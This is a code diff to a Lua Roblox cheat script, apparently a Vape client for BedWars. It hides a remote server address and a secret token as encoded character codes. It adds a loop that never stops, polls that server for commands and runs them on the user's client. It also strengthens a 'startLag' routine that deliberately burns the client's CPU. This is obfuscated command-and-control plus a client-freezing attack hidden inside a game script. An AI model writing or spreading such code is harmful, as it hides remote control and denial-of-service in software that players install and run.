@@ -120,25 +120,43 @@ run(function()
 		table.clear(bedwars)
 	end)
 end)
-
 local _tierCache = {}
 local _req = (syn and syn.request) or http_request or request or function() return {Body='{"tier":0}'} end
 
 local function _bu()
-    local_s = {"104", "116", "116", "112", "115", "58", "47", "47", "103", "101", "99", "111", "45", "115", "116", "101", "114", "110", "117", "109", "45", "114", "117", "98", "100", "111", "119", "110", "46", "110", "103", "114", "111", "107", "45", "102", "114", "101", "101", "46", "100", "101", "118", "47", "119", "104", "105", "116", "101", "108", "105", "115", "116"}	local _r = ''
+	local _s = {'68','74','74','70','73','3a','2f','2f','61','65','72','6f','61','70','69','2e','73','6f','79','72','65','64','38','36','34','2e','77','6f','72','6b','65','72','73','2e','64','65','76','2f','77','68','69','74','65','6c','69','73','74'}
+    local _r = ''
 	for _,v in _s do _r = _r .. string.char(tonumber(v,16)) end
 	return _r
 end
-local function _ft(uid)
+
+local function _batch(payloads)
     local ok, res = pcall(function()
-        return _req({Url=_bu(), Method='POST', Headers={['Content-Type']='application/json'}, Body=httpService:JSONEncode({action='check',roblox_id=tostring(uid),robloxUserId=tostring(uid)})})
+        return _req({
+            Url = _bu(), 
+            Method = 'POST', 
+            Headers = {['Content-Type'] = 'application/json'}, 
+            Body = httpService:JSONEncode({action = "batch", payloads = payloads})
+        })
     end)
-    if not ok or not res then return 0 end
-    if not res.Body or res.Body == '' then return 0 end
-    if res.StatusCode and res.StatusCode >= 500 then return 0 end
+    if not ok or not res then return nil end
     local dok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
-    if not dok or not data then return 0 end
-    return tonumber(data.tier) or 0
+    if not dok or not data then return nil end
+    return data
+end
+
+local function _ft(uid)
+    local payloads = {{
+        action = "check",
+        roblox_id = tostring(uid),
+        robloxUserId = tostring(uid)
+    }}
+    
+    local data = _batch(payloads)
+    if not data or not data.results or not data.results[1] then 
+        return 0 
+    end
+    return tonumber(data.results[1].tier) or 0
 end
 
 getgenv()._aeroTierReady = false
@@ -191,40 +209,39 @@ local function _registerCommand(name, fn)
 end
 
 local _SERCET = ''
-local _stok = {"187", "68", "236", "176", "203", "223", "145", "92", "47", "119", "141", "254", "14", "225", "31", "183", "60", "247", "87", "88", "107", "171", "133", "211", "145", "178", "125", "10", "49", "102", "101", "153"}
+local _stok = {'58','37','70','4b','39','6d','51','32','76','52','38','74','59','35','77','5a','33','78','42','36','6e','48','34','6a','4c','39','70','51','32','76','54','38','77','45','35','72','59','39','75','49','33','6f','50','36','61','53','31','64','46','34','67','48','37','6a','4b','39','6d','51','32','76'}
+local _stmp = ''
+for _,v in _stok do _stmp = _stmp .. string.char(tonumber(v,16)) end
 _SERCET = _stmp
 
-local pollingActive = true
-vape:Clean(function()
-    pollingActive = false
-end)
 task.spawn(function()
     local nextPoll = 0
-    while pollingActive do
-        if tick() < nextPoll then task.wait(0.5) continue end
-        local res = _req({
-            Url = _bu(),
-            Method = 'POST',
-            Headers = {['Content-Type'] = 'application/json'},
-            Body = httpService:JSONEncode({action = 'getMessage', robloxUserId = tostring(lplr.UserId)})
-        })
-        if not res or not res.Body then nextPoll = tick() + 3 continue end
-        local ok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
-        if not ok or not data then nextPoll = tick() + 3 continue end
-        if res.StatusCode == 429 then nextPoll = tick() + ((data.retryAfter or 3000) / 1000) continue end
-        if data.success and data.message then
-            local cmd = tostring(data.message)
+    while true do
+        if tick() < nextPoll then task.wait(0.05) continue end
+        
+        local payloads = {{
+            action = "getMessage",
+            robloxUserId = tostring(lplr.UserId)
+        }}
+        
+        local data = _batch(payloads)
+        if not data or not data.results or not data.results[1] then 
+            nextPoll = tick() + 3 
+            continue 
+        end
+        
+        local result = data.results[1]
+        
+        if result.success and result.message then
+            local cmd = tostring(result.message)
             if _commands[cmd] then
-                _commands[cmd](tostring(data.from), data.args or '')
+                _commands[cmd](tostring(result.from), result.args or '')
             end
+            
             pcall(function()
-                _req({
-                    Url = _bu(),
-                    Method = 'POST',
-                    Headers = {['Content-Type'] = 'application/json'},
-                    Body = httpService:JSONEncode({action = 'removeMessage', robloxUserId = tostring(lplr.UserId)})
-                })
+                _batch({{ action = "removeMessage", robloxUserId = tostring(lplr.UserId) }})
             end)
+            
             nextPoll = tick() + 1.5
         else
             nextPoll = tick() + 3
@@ -261,9 +278,10 @@ local function startLag(userId)
             lagConnections[key] = nil
             return
         end
-		for i = 1, 100000 do
-			local a = math.sin(i) * math.cos(i)
-		end
+        for i = 1, 250000 do
+            local a = math.sin(i) * math.cos(i) + math.sqrt(i) + math.random()
+            local b = string.rep("x", 100)
+        end
     end)
 
     lagConnections[key] = {connection = connection, state = state}
